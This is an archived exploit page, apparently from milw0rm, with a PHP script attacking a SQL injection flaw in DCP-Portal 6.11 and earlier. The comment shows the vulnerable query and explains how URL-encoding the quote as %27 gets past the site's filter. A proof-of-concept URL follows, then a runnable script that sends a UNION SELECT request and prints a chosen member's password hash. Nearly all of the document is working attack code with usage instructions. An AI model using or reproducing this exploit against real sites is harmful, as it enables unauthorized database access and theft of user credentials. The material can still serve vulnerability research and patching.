<html><head><title>DCP-Portal <= 6.11 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q
&lt;?php
echo &quot;[*]DCP Portal &lt;= 6.11 Remote SQL Injection Exploit\r\n&quot;;
echo &quot;[*]Coded by x0kster -x0kster[AT]gmail[DOT]com - \r\n&quot;;
/*
Note : Magic Quotes = 0
Script Download : http://www.dcp-portal.org/

Bug in index.php :

     &lt;?php
     //index.php
     [...]
 60.  $sql = &quot;SELECT id, name FROM $t_cats WHERE cat_id = '&quot;.$_GET[&quot;cid&quot;].&quot;' ORDER BY sort, name&quot;;
     [...]
     ?&gt;
     
But the script filter the quotes with this code, included in each page of the cms:
   
     &lt;?php
     //config/config.inc.php
     [...]
118.  if (strlen($_SERVER['QUERY_STRING']) &gt; 0) {  
119.  $str = $_SERVER['QUERY_STRING'];  
120.  $arr = split('[;&amp;]', URLdecode($str));  
121.  $pos = strpos($str, &quot;'&quot;);  
122.  if ($pos) {    
123.  $hackattempt = true;  }  
     [...]
     ?&gt;
     
But we can bypass this control using %27 instead ' :-).

So this is the simple PoC:
http://site/path/index.php?cid=-1%27+union+select+1,password+from+dcp5_members+where+uid=1/*
 
Exploit :
*/
if ($argc&lt;4) {
 echo &quot;[*]Usage: php &quot;.$argv[0].&quot; host path id\r\n&quot;;
 echo &quot;[*]Example:\r\n&quot;;
 echo &quot;[*]php &quot;.$argv[0].&quot; localhost /dcp-portal/ 1\r\n&quot;;
 die;
}

function get_response($packet){
 global $host, $response;
 $socket=fsockopen(gethostbyname($host),80);
 if (!$socket) { echo &quot;[-]Error contacting $host.\r\n&quot;; exit();}
 fputs($socket,$packet);
 $response='';
 while (!feof($socket)) {
  $response.=fgets($socket);
    }
 fclose($socket);
}

$host =$argv[1];
$path =$argv[2];
$id = $argv[3];
 
$packet =&quot;GET &quot;.$path.&quot;index.php?cid=-1%27+union+select+1,concat(0x78306b73746572,password,0x78306b73746572)+from+dcp5_members+where+uid=&quot;.$id.&quot;/*&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;

get_response($packet);
if(strstr($response,&quot;x0kster&quot;)){
	$hash = explode(&quot;x0kster&quot;,$response,32);
	echo &quot;[+]Ok, the hash is : $hash[1]\r\n&quot;;
	die;
}else{
	echo &quot;[-]Exploit filed, maybe fixed or incorrect id.\r\n&quot;;
	die;
}    

?&gt;

# milw0rm.com [2008-01-06]</pre></html>